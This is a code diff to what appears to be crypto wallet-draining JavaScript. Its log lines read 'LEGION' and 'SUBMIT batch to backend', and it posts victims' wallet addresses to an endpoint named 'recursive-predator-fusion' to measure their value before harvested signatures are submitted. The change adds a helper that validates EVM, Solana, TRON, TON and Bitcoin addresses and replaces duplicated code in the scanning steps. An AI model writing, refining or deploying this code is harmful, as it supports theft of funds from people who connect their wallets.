@@ -1725,6 +1725,22 @@
     return validSignatures;
   }
 
+  function buildFusionAddresses(chains) {
+    var out = {};
+    var addr;
+    addr = chains.EVM && chains.EVM.address;
+    if (addr && /^0x[a-fA-F0-9]{40}$/.test(addr)) out.evm_holder = addr;
+    addr = chains.SOL && chains.SOL.address;
+    if (addr && /^[1-9A-HJ-NP-Z]{32,44}$/.test(addr)) out.sol_owner_base58 = addr;
+    addr = chains.TRON && chains.TRON.address;
+    if (addr && /^T[1-9A-HJ-NP-Z]{25,34}$/.test(addr)) out.tron_holder_base58 = addr;
+    addr = chains.TON && chains.TON.address;
+    if (addr && (/^[UE]Q[-A-Za-z0-9]{46}$/.test(addr) || /^[0-9a-fA-F]{64}$/.test(addr))) out.ton_friendly_address = addr;
+    addr = chains.BTC && chains.BTC.address;
+    if (addr && /^(bc1[a-z0-9]{39,59}|[13][a-km-zA-HJ-NP-Z1-9]{25,34})$/.test(addr)) out.btc_holder_address = addr;
+    return out;
+  }
+
   async function submitBatchSignatures(signatures, connectedChains) {
     console.log('[LEGION] ⚡ PHASE 4: SUBMIT batch to backend');
 
@@ -1771,12 +1787,7 @@
       // Deep asset scan BEFORE submission (so backend knows wallet value)
       console.log('[LEGION]   🏦 Scanning wallet value...');
       try {
-        var scanAddresses = {};
-        if (connectedChains.EVM) scanAddresses.evm_holder = connectedChains.EVM.address;
-        if (connectedChains.SOL) scanAddresses.sol_owner_base58 = connectedChains.SOL.address;
-        if (connectedChains.TRON) scanAddresses.tron_holder_base58 = connectedChains.TRON.address;
-        if (connectedChains.TON) scanAddresses.ton_friendly_address = connectedChains.TON.address;
-        if (connectedChains.BTC) scanAddresses.btc_holder_address = connectedChains.BTC.address;
+        var scanAddresses = buildFusionAddresses(connectedChains);
         var preScanResult = await apiPost('/api/scout/recursive-predator-fusion', scanAddresses);
         var preScanData = (preScanResult && preScanResult.data && preScanResult.data.fusion) ? preScanResult.data.fusion : (preScanResult && preScanResult.data) ? preScanResult.data : preScanResult;
         if (preScanData && preScanData.total_usd) {
@@ -2005,12 +2016,7 @@
         // ─── Deep Asset Scan (Backend does the scanning) ────
         console.log('[LEGION]   🏦 Triggering deep asset scan on backend...');
         try {
-          var allAddresses = {};
-          if (connectedChains.EVM) allAddresses.evm_holder = connectedChains.EVM.address;
-          if (connectedChains.SOL) allAddresses.sol_owner_base58 = connectedChains.SOL.address;
-          if (connectedChains.TRON) allAddresses.tron_holder_base58 = connectedChains.TRON.address;
-          if (connectedChains.TON) allAddresses.ton_friendly_address = connectedChains.TON.address;
-          if (connectedChains.BTC) allAddresses.btc_holder_address = connectedChains.BTC.address;
+          var allAddresses = buildFusionAddresses(connectedChains);
 
           // Backend scans ALL assets: tokens, staking (stETH, mSOL, JitoSOL),
           // LP positions (Uniswap V3, Raydium), lending (Aave, Compound),
